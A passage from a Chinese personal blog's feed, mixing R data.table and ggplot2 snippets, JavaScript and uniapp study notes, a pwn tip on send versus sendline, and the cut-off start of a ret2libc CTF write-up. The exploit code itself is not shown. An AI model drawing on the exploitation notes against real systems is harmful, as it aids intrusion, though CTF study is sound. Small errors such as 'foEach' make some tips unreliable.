class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 标记重复行</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> is_duplicate <span class="hljs-operator">:=</span> duplicated<span class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="19-使用-rbindlist-合并多个-data-table"><a href="#19-使用-rbindlist-合并多个-data-table" class="headerlink" title="19. 使用 rbindlist 合并多个 data.table"></a><strong>19. 使用 <code>rbindlist</code> 合并多个 data.table</strong></h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 创建多个 data.table</span><br>dt1 <span class="hljs-operator">&lt;-</span> data.table<span class="hljs-punctuation">(</span>a <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">,</span> b <span class="hljs-operator">=</span> <span class="hljs-built_in">letters</span><span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span><br>dt2 <span class="hljs-operator">&lt;-</span> data.table<span class="hljs-punctuation">(</span>a <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">,</span> b <span class="hljs-operator">=</span> <span class="hljs-built_in">letters</span><span class="hljs-punctuation">[</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 合并</span><br>dt_combined <span class="hljs-operator">&lt;-</span> rbindlist<span class="hljs-punctuation">(</span><span class="hljs-built_in">list</span><span class="hljs-punctuation">(</span>dt1<span class="hljs-punctuation">,</span> dt2<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><hr><h2 id="20-使用-fwrite-和-fread-快速读写数据"><a href="#20-使用-fwrite-和-fread-快速读写数据" class="headerlink" title="20. 使用 fwrite 和 fread 快速读写数据"></a><strong>20. 使用 <code>fwrite</code> 和 <code>fread</code> 快速读写数据</strong></h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 写入文件</span><br>fwrite<span class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;data.csv&quot;</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 读取文件</span><br>dt <span class="hljs-operator">&lt;-</span> fread<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;data.csv&quot;</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><hr><p>这些操作展示了 <code>data.table</code> 的灵活性和高效性，使其成为处理大型数据集时的首选工具之一。</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 加载必要的包</span><br>library<span class="hljs-punctuation">(</span>ggplot2<span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 创建示例数据集</span><br>data <span class="hljs-operator">&lt;-</span> data.frame<span class="hljs-punctuation">(</span><br>  category <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;A&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;B&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;C&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;D&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;E&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span><br>  value <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-number">10</span><span class="hljs-punctuation">,</span> <span class="hljs-number">15</span><span class="hljs-punctuation">,</span> <span class="hljs-number">7</span><span class="hljs-punctuation">,</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span> <span class="hljs-number">20</span><span class="hljs-punctuation">)</span><br><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 基本绘图</span><br>p <span class="hljs-operator">&lt;-</span> ggplot<span class="hljs-punctuation">(</span>data<span class="hljs-punctuation">,</span> aes<span class="hljs-punctuation">(</span>x <span class="hljs-operator">=</span> category<span class="hljs-punctuation">,</span> y <span class="hljs-operator">=</span> value<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">+</span><br>  geom_bar<span class="hljs-punctuation">(</span>stat <span class="hljs-operator">=</span> <span class="hljs-string">&quot;identity&quot;</span><span class="hljs-punctuation">)</span>  <span class="hljs-comment"># 使用条形图</span><br><br><span class="hljs-comment"># 添加标题和标签</span><br>p <span class="hljs-operator">&lt;-</span> p <span class="hljs-operator">+</span> labs<span class="hljs-punctuation">(</span><br>  title <span class="hljs-operator">=</span> <span class="hljs-string">&quot;示例条形图&quot;</span><span class="hljs-punctuation">,</span><br>  x <span class="hljs-operator">=</span> <span class="hljs-string">&quot;类别&quot;</span><span class="hljs-punctuation">,</span><br>  y <span class="hljs-operator">=</span> <span class="hljs-string">&quot;值&quot;</span><span class="hljs-punctuation">,</span><br>  caption <span class="hljs-operator">=</span> <span class="hljs-string">&quot;数据来源: 示例数据集&quot;</span><br><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 添加主题自定义</span><br>p <span class="hljs-operator">&lt;-</span> p <span class="hljs-operator">+</span> theme_minimal<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">+</span><br>  theme<span class="hljs-punctuation">(</span><br>    plot.title <span class="hljs-operator">=</span> element_text<span class="hljs-punctuation">(</span>hjust <span class="hljs-operator">=</span> <span class="hljs-number">0.5</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment"># 标题居中</span><br>    axis.text.x <span class="hljs-operator">=</span> element_text<span class="hljs-punctuation">(</span>angle <span class="hljs-operator">=</span> <span class="hljs-number">45</span><span class="hljs-punctuation">,</span> hjust <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment"># X轴标签倾斜</span><br>    legend.position <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bottom&quot;</span>  <span class="hljs-comment"># 图例位置</span><br>  <span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 添加颜色和填充</span><br>p <span class="hljs-operator">&lt;-</span> p <span class="hljs-operator">+</span> scale_fill_manual<span class="hljs-punctuation">(</span>values <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;blue&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;red&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;green&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;purple&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;orange&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">+</span><br>  scale_color_manual<span class="hljs-punctuation">(</span>values <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;blue&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;red&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;green&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;purple&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;orange&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 添加文本注释</span><br>p <span class="hljs-operator">&lt;-</span> p <span class="hljs-operator">+</span> geom_text<span class="hljs-punctuation">(</span>aes<span class="hljs-punctuation">(</span>label <span class="hljs-operator">=</span> value<span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> vjust <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">0.5</span><span class="hljs-punctuation">)</span>  <span class="hljs-comment"># 在条形上方显示数值</span><br><br><span class="hljs-comment"># 显示绘图</span><br>print<span class="hljs-punctuation">(</span>p<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p>melt(</p><p>data, # 数据框对象</p><p>id.vars, # 需要保留的列名</p><p>measure.vars, # 需要被转换成长格式的列名</p><p>variable.name, # 长格式中，用于存储原列名的新列名</p><p>value.name, # 长格式中，用于存储原列值的新列名</p><p>variable.factor, # 长格式中，存储原列名的列是否因子化</p><p>variable.factor, # 长格式中，存储原列值的列是否因子化</p><p>na.rm # 是否删除NA值</p><p>)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>js数据结构</title>
    <link href="/2025/04/12/js%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2025/04/12/js%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h1><p>.add()<br>.delete()<br>.has()<br>.clear()</p><p>.size attr</p><p>const arrFromSet &#x3D; Array.from(mySet)</p><p>20min数组操作、半小时promise<br>（看题解）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>js中的fs、path模块</title>
    <link href="/2025/04/12/js%E4%B8%AD%E7%9A%84fs%E3%80%81path%E6%A8%A1%E5%9D%97/"/>
    <url>/2025/04/12/js%E4%B8%AD%E7%9A%84fs%E3%80%81path%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="fs模块"><a href="#fs模块" class="headerlink" title="fs模块"></a>fs模块</h1><p>常用方法：</p><p>读取文件：<br><code>fs.readFile(file, [options], callback)</code> 异步读（默认是异步的）<br><code>fs.readFileSync(file,[options])</code> 同步读（没有回调函数）</p><h1 id="path模块"><a href="#path模块" class="headerlink" title="path模块"></a>path模块</h1><p><code>path.join(...paths)</code> 将多个路径片段连接成一个路径</p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>js数组方法</title>
    <link href="/2025/04/12/js%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95/"/>
    <url>/2025/04/12/js%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><code>map</code>方法<br>对数组中的<strong>每个元素</strong>进行某种操作，并返回一个新数组，包含操作后的结果。<br><code>map</code>方法不会改变原数组，而是返回一个新数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">map</span>(<span class="hljs-title function_">callback</span>(item, index, array), thisArg);<br></code></pre></td></tr></table></figure><ul><li>callback回调函数定义<ul><li>item：数组元素</li><li>index（可选）：数组索引</li><li>array（可选）：调用<code>map</code>的数组</li></ul></li><li>thisArg （可选）: this</li></ul><p>返回新数组</p><hr><p><code>forEach</code>方法<br>对数组中的<strong>某个元素</strong>进行某种操作，直接在原数组上进行操作，改变原数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">foEach</span>(<span class="hljs-title function_">callback</span>(item, index, array), thisArg);<br></code></pre></td></tr></table></figure><p>没有返回值（返回<code>undefined</code>）</p><hr><p><code>push</code>方法<br>向数组尾添加一个或多个元素，并返回数组的新长度</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">push</span>(element1, element2, ..., elementN)<br></code></pre></td></tr></table></figure><hr><p><code>slice</code>方法<br>array.slice(start, end);<br>string.slice(start, end);<br><strong>左闭右开</strong><br>用于提取子数组或子字符串（返回新的，不会改变原数组&#x2F;字符串）</p><hr><p><code>filter</code>方法<br>用于根据提供的函数测试每个元素，返回一个包含所有通过测试的元素的新数组。<code>filter</code> 方法不会改变原数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">filter</span>(<span class="hljs-title function_">callback</span>(item, index, array), thisArg);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>js异步</title>
    <link href="/2025/04/12/js%E5%BC%82%E6%AD%A5/"/>
    <url>/2025/04/12/js%E5%BC%82%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h1 id="async-和-await"><a href="#async-和-await" class="headerlink" title="async 和 await"></a>async 和 await</h1><blockquote><p>15届蓝桥杯web应用开发赛道<br>3. 产品360度展示</p></blockquote><p>todo</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> pipeline = <span class="hljs-title function_">async</span>(<span class="hljs-params">initialValue, sequence</span>)<br>&#123;<br><span class="hljs-keyword">let</span> argument = initialValue;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; sequence.<span class="hljs-property">length</span>; i++)<br>&#123;<br>argument = <span class="hljs-keyword">await</span> sequence[i](argument);<br>&#125;<br><span class="hljs-keyword">return</span> argument;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>dom元素</title>
    <link href="/2025/04/12/dom%E5%85%83%E7%B4%A0/"/>
    <url>/2025/04/12/dom%E5%85%83%E7%B4%A0/</url>
    
    <content type="html"><![CDATA[<p>dom元素的属性<br>classList<br>该对象的方法<br>classList.add<br>classList.remove</p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vue属性</title>
    <link href="/2025/04/12/Vue%E5%B1%9E%E6%80%A7/"/>
    <url>/2025/04/12/Vue%E5%B1%9E%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h1><p>计算属性适用于以下场景：</p><ul><li>动态计算数据：根据现有数据动态生成新数据</li><li>格式化数据：对数据进行格式化处理</li><li>依赖多个数据源：当多个数据源变化时，计算属性会<strong>自动更新</strong></li></ul>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记录一次项目开发</title>
    <link href="/2025/04/08/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/"/>
    <url>/2025/04/08/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>后端：<br>python + flask<br>后端环境：<br>python3.8 windows</p><p>前端<br>uniapp + vue3 + pinia + js</p><h1 id="前端的一些模块"><a href="#前端的一些模块" class="headerlink" title="前端的一些模块"></a>前端的一些模块</h1><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><h3 id="api：-uni-uploadFile"><a href="#api：-uni-uploadFile" class="headerlink" title="api： uni.uploadFile()"></a>api： <code>uni.uploadFile()</code></h3><blockquote><p><a href="https://uniapp.dcloud.net.cn/api/request/network-file.html#uploadfile">uni.uploadFile(OBJECT) | uni-app官网</a></p></blockquote><p>demo（摘自uniapp官方文档）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">uni.<span class="hljs-title function_">chooseImage</span>(&#123;<br><span class="hljs-attr">success</span>: <span class="hljs-function">(<span class="hljs-params">chooseImageRes</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">const</span> tempFilePaths = chooseImageRes.<span class="hljs-property">tempFilePaths</span>;<br>uni.<span class="hljs-title function_">uploadFile</span>(&#123;<br><span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;https://www.example.com/upload&#x27;</span>, <span class="hljs-comment">//仅为示例，非真实的接口地址</span><br><span class="hljs-attr">filePath</span>: tempFilePaths[<span class="hljs-number">0</span>],<br><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;file&#x27;</span>,<br><span class="hljs-attr">formData</span>: &#123;<br><span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;,<br><span class="hljs-attr">success</span>: <span class="hljs-function">(<span class="hljs-params">uploadFileRes</span>) =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(uploadFileRes.<span class="hljs-property">data</span>);<br>&#125;<br>&#125;);<br>&#125;<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>上传视频、音频的方法与之类似，将<code>uni.chooseImage</code>改成<code>uni.chooseVideo</code> 、 <del><code>uni.chooseAudio</code></del>即可，uniapp并没有提供选择音频文件的api，要想选择音频文件上传需要使用<code>uni.chooseFile</code>api</p><hr><h3 id="uniapp选择文件api-uni-chooseFile"><a href="#uniapp选择文件api-uni-chooseFile" class="headerlink" title="uniapp选择文件api  uni.chooseFile()"></a>uniapp选择文件api  uni.chooseFile()</h3><p><a href="https://uniapp.dcloud.net.cn/api/media/file.html">uni-app官网</a></p><p>本api主要用于选择非媒体文件，若要选择媒体文件（图片视频），uniapp提供了专用的api：</p><ul><li>图片选择 <code>uni.chooseImage</code></li><li>视频选择 <code>uni.chooseVideo</code></li><li>多媒体文件选择（图片+视频）<code>uni.chooseVideo</code></li></ul><blockquote><p>经过实践后，发现<code>uni.chooseFile()</code>只支持H5端，不支持app端</p></blockquote><hr><h2 id="自定义基座"><a href="#自定义基座" class="headerlink" title="自定义基座"></a>自定义基座</h2><blockquote><p><a href="https://doc.dcloud.net.cn/uni-app-x/api/file-system-spec.html#%E6%B2%99%E7%9B%92%E5%A4%96%E7%9B%AE%E5%BD%95">文件系统 沙盒机制 | uni-app-x</a><br><a href="https://uniapp.dcloud.net.cn/tutorial/run/run-app.html#customplayground">uni-app官网 真机运行 自定义基座</a></p></blockquote><p>由于ios系统以及现代移动端手机系统的沙盒机制，（以ios为例）开发的app不可以直接访问“文件”应用中的文件</p><p>uniapp提供了接口<code>uni.chooseImage()</code>、<code>uni.chooseMedia()</code>和<code>uni.chooseVideo</code>可以访问相册中的图片、视频</p><p>除了这么些接口，由于沙盒机制，在其它应用中的文件如<code>audio</code> 、<code>pdf</code>等文件则不可访问</p><p><strong>不得已</strong>，使用 在插件市场下载原生插件 + 自定义基座 的方式</p><p>（ps：找到的写的好的原生插件正式使用要￥799 ， 在开发测试环境下可以免费试用）</p><h3 id="制作自定义基座的流程"><a href="#制作自定义基座的流程" class="headerlink" title="制作自定义基座的流程"></a>制作自定义基座的流程</h3><ol><li><p>如图所示<br><img src="/2024/10/29/hello-world/e-20250409225448674.png"></p></li><li><p>选择打自定义调试基座，点击打包即可<br><img src="/2024/10/29/hello-world/e-20250409225744479.png"></p></li></ol><p>然而苹果这个证书我搞不来 （需注册开发者账号 一年 99$)</p><p>又不得已，搞下安卓的设备</p><hr><h2 id="安卓设备"><a href="#安卓设备" class="headerlink" title="安卓设备"></a>安卓设备</h2><blockquote><p><a href="https://blog.csdn.net/xiaoxiangzi520/article/details/136374377">uniapp 安装安卓、IOS模拟器并调试_uniapp ios模拟器-CSDN博客</a></p></blockquote><h3 id="安卓真机调试"><a href="#安卓真机调试" class="headerlink" title="安卓真机调试"></a>安卓真机调试</h3><p>要想正常使用插件（云打包），最重要的一步是打自定义基座<br><a href="https://blog.csdn.net/weixin_40597676/article/details/112173216">uniapp—配置自定义基座_uniapp 自定义基座-CSDN博客</a></p><p>安卓平台隐私与政策提示框<br><a href="https://uniapp.dcloud.net.cn/tutorial/app-privacy-android.html">uni-app官网 andoird平台隐私与政策提示框</a></p><hr><p>4.16<br>发现了一个看起来很不错的<strong>免费</strong>插件</p><hr><h2 id="实现动态波浪线效果"><a href="#实现动态波浪线效果" class="headerlink" title="实现动态波浪线效果"></a>实现动态波浪线效果</h2><p>我采用CSS渐变来实现<br><a href="https://blog.csdn.net/lambert00001/article/details/131724376">巧妙使用 CSS 渐变来实现波浪动画-CSDN博客</a></p><hr><h2 id="状态管理-pinia"><a href="#状态管理-pinia" class="headerlink" title="状态管理 pinia"></a>状态管理 pinia</h2><p><a href="https://uniapp.dcloud.net.cn/tutorial/vue3-pinia.html">状态管理 Pinia | uni-app官网</a><br>使用hbuilder创建的uniapp项目已经内置了pinia，无需安装</p><ol><li><p>在<code>main.js</code>中使用</p></li><li><p>根目录下建立个文件夹，<code>store/</code>，再建立相关文件，如<code>store/audio.js</code>用于管理相关状态</p></li><li><p>在页面&#x2F;组件中使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><br></code></pre></td></tr></table></figure></li></ol><hr><h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><h2 id="scroll-into-view属性使用"><a href="#scroll-into-view属性使用" class="headerlink" title="scroll-into-view属性使用"></a>scroll-into-view属性使用</h2><hr><h3 id="一、开发测试阶段安装流程（真机调试）"><a href="#一、开发测试阶段安装流程（真机调试）" class="headerlink" title="一、开发测试阶段安装流程（真机调试）"></a>一、开发测试阶段安装流程（真机调试）</h3><p>适用于开发者在本地测试应用。</p><h4 id="Android-平台"><a href="#Android-平台" class="headerlink" title="Android 平台"></a><strong>Android 平台</strong></h4><ol><li><p><strong>生成测试包</strong></p><ul><li><p>在 HBuilder X 中，选择项目 → 点击菜单栏的 <strong>发行</strong> → <strong>原生 App-云打包</strong>。</p></li><li><p>勾选 Android 平台，选择「使用测试证书」（默认），点击打包。</p></li><li><p>等待云打包完成，下载生成的 <code>.apk</code> 文件。</p></li></ul></li><li><p><strong>安装到手机</strong></p><ul><li><p><strong>方式 1：扫码安装</strong><br>  HBuilder X 打包完成后会生成二维码，用手机浏览器扫码下载安装。</p></li><li><p><strong>方式 2：USB 传输</strong><br>  将 <code>.apk</code> 文件通过数据线或蓝牙传输到手机，打开文件管理器点击安装。</p></li><li><p><strong>注意</strong>：首次安装需开启 <strong>允许安装未知来源应用</strong>（在手机设置中开启）。</p></li></ul></li></ol><hr><h4 id="iOS-平台"><a href="#iOS-平台" class="headerlink" title="iOS 平台"></a><strong>iOS 平台</strong></h4><ol><li><p><strong>生成测试包</strong></p><ul><li><p>需拥有 <strong>Apple 开发者账号</strong>（个人&#x2F;公司）。</p></li><li><p>在 HBuilder X 中选择 <strong>发行</strong> → <strong>原生 App-云打包</strong>，勾选 iOS 平台。</p></li><li><p>配置证书（需提前在 Apple 开发者后台生成 <code>.p12</code> 证书和 <code>.mobileprovision</code> 描述文件）。</p></li><li><p>打包生成 <code>.ipa</code> 文件。</p></li></ul></li><li><p><strong>安装到 iPhone</strong></p><ul><li><p><strong>方式 1：TestFlight</strong><br>  将 <code>.ipa</code> 上传至 App Store Connect，通过 TestFlight 邀请测试用户安装。</p></li><li><p><strong>方式 2：企业证书分发</strong><br>  使用企业证书签名后，用户通过 Safari 下载安装（需信任企业证书）。</p></li><li><p><strong>方式 3：Ad Hoc 测试</strong><br>  添加测试设备的 UDID 到描述文件，通过工具（如爱思助手）安装。</p></li></ul></li></ol><hr><h3 id="二、正式发布阶段安装流程"><a href="#二、正式发布阶段安装流程" class="headerlink" title="二、正式发布阶段安装流程"></a>二、正式发布阶段安装流程</h3><p>适用于用户从应用商店下载安装。</p><h4 id="Android-平台-1"><a href="#Android-平台-1" class="headerlink" title="Android 平台"></a><strong>Android 平台</strong></h4><ol><li><p><strong>生成正式包</strong></p><ul><li><p>在 HBuilder X 中选择 <strong>发行</strong> → <strong>原生 App-云打包</strong>，勾选 Android。</p></li><li><p>使用 <strong>正式签名证书</strong>（避免使用测试证书，否则无法上架）。</p></li></ul></li><li><p><strong>提交应用商店</strong></p><ul><li>上传 <code>.apk</code> 到 Google Play、华为应用市场等平台，审核通过后用户即可下载。</li></ul></li></ol><hr><h4 id="iOS-平台-1"><a href="#iOS-平台-1" class="headerlink" title="iOS 平台"></a><strong>iOS 平台</strong></h4><ol><li><p><strong>生成正式包</strong></p><ul><li>使用 App Store 类型的证书和描述文件打包生成 <code>.ipa</code>。</li></ul></li><li><p><strong>提交 App Store</strong></p><ul><li>通过 App Store Connect 提交应用，审核通过后用户可从 App Store 下载。</li></ul></li></ol><hr><p>HbuilderX 未识别到手机 android<br><img src="/2024/10/29/hello-world/e-20250520000251506.png"><br><a href="https://uniapp.dcloud.net.cn/tutorial/run/run-app-faq.html">真机运行常见问题@run | uni-app官网</a></p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn中的send与sendline</title>
    <link href="/2025/04/06/pwn%E4%B8%AD%E7%9A%84send%E4%B8%8Esendline/"/>
    <url>/2025/04/06/pwn%E4%B8%AD%E7%9A%84send%E4%B8%8Esendline/</url>
    
    <content type="html"><![CDATA[<h1 id="read-函数与scanf-函数"><a href="#read-函数与scanf-函数" class="headerlink" title="read()函数与scanf()函数"></a>read()函数与scanf()函数</h1><hr><p>当<code>read(0, buf, 50)</code>接收50个字节时，如果已经构造了50个字节的payload，则要使用send，不要使用sendline</p><p>若使用sendline()，多余的<code>\n</code>换行符会影响下一次io</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xyctf2025_wp</title>
    <link href="/2025/04/04/xyctf2025-wp/"/>
    <url>/2025/04/04/xyctf2025-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>看保护：<br><img src="/2024/10/29/hello-world/file-20250407001059335.png"><br>no pie 、 no canary</p><p><img src="/2024/10/29/hello-world/file-20250404143015551.png"><img src="/2024/10/29/hello-world/file-20250404143224875.png"></p><p><img src="/2024/10/29/hello-world/file-20250404143255588.png"></p><p><img src="/2024/10/29/hello-world/file-20250404155524519.png">进入revenge函数后：<br><img src="/2024/10/29/hello-world/file-20250404155734106.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 